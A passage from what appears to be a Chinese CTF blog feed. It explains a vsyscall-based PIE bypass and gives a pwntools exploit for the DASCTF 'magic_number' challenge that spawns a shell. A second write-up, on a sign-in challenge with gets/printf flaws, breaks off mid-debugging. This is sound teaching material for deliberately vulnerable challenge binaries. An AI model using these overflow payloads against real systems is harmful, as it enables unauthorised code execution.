operator">:</span>000000000000080A                 align 800hseg000<span class="token operator">:</span>000000000000080A seg000          endsseg000<span class="token operator">:</span>000000000000080Aseg000<span class="token operator">:</span>000000000000080Aseg000<span class="token operator">:</span>000000000000080A                 end</code></pre><p>可以看到这里有三个系统调用，从上到下依次为gettimeofday，time，getcpu（查系统调用号）。都是系统调用，都包含syscall指令，也许这个syscall将来可以利用。</p><p>注意：<br><strong>当我们直接调用vsyscall中的syscall时，会提示段错误，这是因为vsyscall执行时会进行检查，如果不是从函数开头执行的话就会出错</strong><br><strong>所以，我们可以直接利用的地址是0xffffffffff600000、0xffffffffff600400、 0xffffffffff600800</strong></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>由于这三个系统调用都是无参数传参，且地址固定，我们可以用来绕过PIE，原因是他们的影响性小且带有ret指令。就可以把这三个系统调用看作三个地址不同的ret指令。我们可以用他们不停的滑到下方栈地址</strong></p><h2 id="滑动绕过演示"><a href="#滑动绕过演示" class="headerlink" title="滑动绕过演示"></a>滑动绕过演示</h2><p>原理：<strong>利用栈里面的数据一般不会被清理干净，还保存着以前的信息可以为我们所用</strong></p><h3 id="DASCTF-七夕赛-magic-number"><a href="#DASCTF-七夕赛-magic-number" class="headerlink" title="DASCTF-七夕赛-magic_number"></a>DASCTF-七夕赛-magic_number</h3><h5 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h5><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>DASCTF<span class="token operator">/</span>七夕$ checksec magic_number<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/DASCTF/\xe4\xb8\x83\xe5\xa4\x95/magic_number'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Full RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      PIE enabled    就canary没开</code></pre><h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h4><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-30h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Ch] [rbp-4h]</span>  <span class="token function">sub_9A0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">0x12345678</span> <span class="token punctuation">)</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your Input :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//溢出点很容易得到：0x30+8</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token keyword">signed</span> __int64 <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  buf <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>那个rand()函数就是从/dev/urandom文件里面读入4个字节到buf，返回buf地址到main函数中的v5</li><li>想让v5 == 0x12345678但/dev/urandom文件无法改，又没有改v5值的方法，所以这是不可能的</li><li>main函数存在栈溢出</li><li>开启PIE，在栈中找到保存main函数中的某些地址（system）</li><li>利用栈溢出跳到system(‘/bin/sh’)处即可</li></ul><h4 id="gdb查看栈信息"><a href="#gdb查看栈信息" class="headerlink" title="gdb查看栈信息"></a>gdb查看栈信息</h4><p><strong>如果直接gdb调试失败，可以在脚本中插入gdb.attach(sh).或者向上面一样找到正在执行中magic_number的PID，用sudo gdb attach PID指令来调试</strong></p><pre class=" language-java"><code class="language-java">RBP<span class="token operator">:</span> <span class="token function">0x562182e3faf0</span> <span class="token punctuation">(</span>push   r15<span class="token punctuation">)</span>RSP<span class="token operator">:</span> <span class="token number">0x7ffe0b264818</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7f0fa29a0b97</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">231</span><span class="token operator">></span><span class="token operator">:</span>    mov    edi<span class="token punctuation">,</span>eax<span class="token punctuation">)</span>RIP<span class="token operator">:</span> <span class="token function">0x562182e3fae6</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span>R8 <span class="token operator">:</span> <span class="token function">0xc</span> <span class="token punctuation">(</span><span class="token string">'\x0c'</span><span class="token punctuation">)</span>R9 <span class="token operator">:</span> <span class="token function">0x7f0fa2f7d4c0</span> <span class="token punctuation">(</span><span class="token number">0x00007f0fa2f7d4c0</span><span class="token punctuation">)</span>R10<span class="token operator">:</span> <span class="token number">0x0</span> R11<span class="token operator">:</span> <span class="token number">0x246</span> R12<span class="token operator">:</span> <span class="token function">0x562182e3f870</span> <span class="token punctuation">(</span>xor    ebp<span class="token punctuation">,</span>ebp<span class="token punctuation">)</span>R13<span class="token operator">:</span> <span class="token number">0x7ffe0b2648f0</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> R14<span class="token operator">:</span> <span class="token number">0x0</span> R15<span class="token operator">:</span> <span class="token number">0x0</span>EFLAGS<span class="token operator">:</span> <span class="token function">0x207</span> <span class="token punctuation">(</span>CARRY PARITY adjust zero sign trap INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>code<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span>   <span class="token number">0x562182e3fadb</span><span class="token operator">:</span>    call   <span class="token number">0x562182e3f838</span> <span class="token operator">&lt;</span>read<span class="token annotation punctuation">@plt</span><span class="token operator">></span>   <span class="token number">0x562182e3fae0</span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span>   <span class="token number">0x562182e3fae5</span><span class="token operator">:</span>    leave  <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x562182e3fae6</span><span class="token operator">:</span>    ret       <span class="token number">0x562182e3fae7</span><span class="token operator">:</span>    nop    WORD PTR <span class="token punctuation">[</span>rax<span class="token operator">+</span>rax<span class="token operator">*</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">0x0</span><span class="token punctuation">]</span>   <span class="token number">0x562182e3faf0</span><span class="token operator">:</span>    push   r15   <span class="token number">0x562182e3faf2</span><span class="token operator">:</span>    push   r14   <span class="token number">0x562182e3faf4</span><span class="token operator">:</span>    mov    r15d<span class="token punctuation">,</span>edi<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264818</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7f0fa29a0b97</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">231</span><span class="token operator">></span><span class="token operator">:</span>    mov    edi<span class="token punctuation">,</span>eax<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264820</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> <span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264828</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x7ffe0b2648f8</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7ffe0b2652f0</span> <span class="token punctuation">(</span><span class="token string">"./magic_number"</span><span class="token punctuation">)</span><span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264830</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x100008000</span> <span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264838</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x562182e3fa80</span> <span class="token punctuation">(</span>push   rbp<span class="token punctuation">)</span><span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264840</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264848</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf14225c379c56e4c</span> <span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7ffe0b264850</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x562182e3f870</span> <span class="token punctuation">(</span>xor    ebp<span class="token punctuation">,</span>ebp<span class="token punctuation">)</span></code></pre><p>在要执行ret时，栈中发现栈第五行存放的地址和main函数中指令地址（ret及以上都是）就差后面两个16进制数。</p><p>找到main中执行system(‘/bin/sh’)的地址信息（用IDA）</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AA8 lea     rdi<span class="token punctuation">,</span> command    <span class="token punctuation">;</span> <span class="token string">"/bin/sh"</span>   《<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>目标<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AAF mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AB4 call    system<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AB9 loc_AB9<span class="token operator">:</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AB9 lea     rdi<span class="token punctuation">,</span> aYourInput <span class="token punctuation">;</span> <span class="token string">"Your Input :"</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AC0 call    puts<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AC5 lea     rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token operator">+</span>buf<span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AC9 mov     edx<span class="token punctuation">,</span> 100h       <span class="token punctuation">;</span> nbytes<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000ACE mov     rsi<span class="token punctuation">,</span> rax        <span class="token punctuation">;</span> buf<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AD1 mov     edi<span class="token punctuation">,</span> <span class="token number">0</span>          <span class="token punctuation">;</span> fd<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AD6 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000ADB call    read<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AE0 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AE5 leave<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000AE6 retn</code></pre><p>由以上信息易知：把栈第五行地址的后两位覆盖为：A8，然后用vsyscall滑到这里来就行了</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>vsyscall <span class="token operator">=</span> <span class="token number">0xffffffffff600000</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x30</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>   <span class="token operator">//</span>此处覆盖RBPpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vsyscall<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vsyscall<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vsyscall<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vsyscall<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\xA8'</span>   <span class="token operator">//</span>对应第五行栈sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./magic_number'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('183.129.189.60',10010)    </span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x59</span> bytes<span class="token operator">:</span>    <span class="token number">00000000</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token operator">*</span>    <span class="token number">00000030</span>  ef be ad de  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">60</span> ff  ff ff ff ff  │····│····│··`·│····│    <span class="token number">00000040</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">60</span> ff  ff ff ff ff  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">60</span> ff  ff ff ff ff  │··`·│····│··`·│····│    <span class="token number">00000050</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">60</span> ff  ff ff ff ff  a8                        │··`·│····│·│    <span class="token number">00000059</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><p>详情见：<a href="http://blog.eonew.cn/archives/968" target="_blank" rel="noopener">http://blog.eonew.cn/archives/968</a>     <a href="https://www.anquanke.com/post/id/177520" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177520</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2020-7月赛--签到</title>
      <link href="/2020/08/24/dasctf2020-7-yue-sai-qian-dao/"/>
      <url>/2020/08/24/dasctf2020-7-yue-sai-qian-dao/</url>
      
        <content type="html"><![CDATA[<p>我之前不知道自己有多菜，然后参加了比赛才知道。。。。。菜的无底线，还请时钟大佬原谅</p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>           <span class="token punctuation">{</span>  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what's your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nCan you solve this sign-in problem?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  backdoor<span class="token punctuation">:</span>  <span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804857D push    ebp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804857E mov     ebp<span class="token punctuation">,</span> esp<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048580</span> sub     esp<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048583</span> sub     esp<span class="token punctuation">,</span> 0Ch<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048586</span> push    offset command  <span class="token punctuation">;</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804858B call    _system<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048590</span> add     esp<span class="token punctuation">,</span> 10h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048593</span> leave<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048594</span> retn</code></pre><p>v4距离栈底0x28，s距离栈底0x18都很容易溢出</p><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>DASCTF$ checksec qiandao<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/DASCTF/qiandao'</span>    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span>基本操作</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在IDA中有两个很明显的漏洞:fmt漏洞  ，StackOverflow漏洞<br>当时我在做题的时候看到这两个漏洞，还有后门我觉这个题稳了。但是狡猾的出题人就时不会让我得偿所愿<del>~</del>·</p><p>我在构造溢出payload时总是无法跳转：payload = ’A’*0x28 + ‘AAAA’ + p32（backdoor），当场懵逼<del>~</del><br>然后再gdb调试的时候才发现了万恶之源。</p><pre class=" language-java"><code class="language-java">EAX<span class="token operator">:</span> <span class="token number">0x0</span> EBX<span class="token operator">:</span> <span class="token number">0x0</span> ECX<span class="token operator">:</span> <span class="token number">0xffffd060</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> EDX<span class="token operator">:</span> <span class="token number">0xf7fb389c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> ESI<span class="token operator">:</span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> EDI<span class="token operator">:</span> <span class="token number">0x0</span> EBP<span class="token operator">:</span> <span class="token number">0x0</span> ESP<span class="token operator">:</span> <span class="token number">0xffffd04c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xf7df5e81</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">241</span><span class="token operator">></span><span class="token operator">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>EIP<span class="token operator">:</span> <span class="token function">0x8048601</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">108</span><span class="token operator">></span><span class="token operator">:</span>    lea    esp<span class="token punctuation">,</span><span class="token punctuation">[</span>ecx<span class="token operator">-</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>EFLAGS<span class="token operator">:</span> <span class="token function">0x282</span> <span class="token punctuation">(</span>carry parity adjust zero SIGN trap INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>code<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span>   <span class="token number">0x80485f8</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span>   <span class="token number">0x80485fd</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">104</span><span class="token operator">></span><span class="token operator">:</span>    mov    ecx<span class="token punctuation">,</span>DWORD PTR <span class="token punctuation">[</span>ebp<span class="token operator">-</span><span class="token number">0x4</span><span class="token punctuation">]</span>   <span class="token number">0x8048600</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">107</span><span class="token operator">></span><span class="token operator">:</span>    leave  <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x8048601</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">108</span><span class="token operator">></span><span class="token operator">:</span>    lea    esp<span class="token punctuation">,</span><span class="token punctuation">[</span>ecx<span class="token operator">-</span><span class="token number">0x4</span><span class="token punctuation">]</span>   <span class="token number">0x8048604</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">111</span><span class="token operator">></span><span class="token operator">:</span>    ret       <span class="token number">0x8048605</span><span class="token operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax   <span class="token number">0x8048607</span><span class="token operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax   <span class="token number">0x8048609</span><span class="token operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0xffffd04c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xf7df5e81</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">241</span><span class="token operator">></span><span class="token operator">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token number">0004</span><span class="token operator">|</span> <span class="token number">0xffffd050</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> <span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0xffffd054</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> <span class="token number">0012</span><span class="token operator">|</span> <span class="token number">0xffffd058</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0xffffd05c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xf7df5e81</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">241</span><span class="token operator">></span><span class="token operator">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token number">0020</span><span class="token operator">|</span> <span class="token number">0xffffd060</span> <span class="token operator">--</span><span 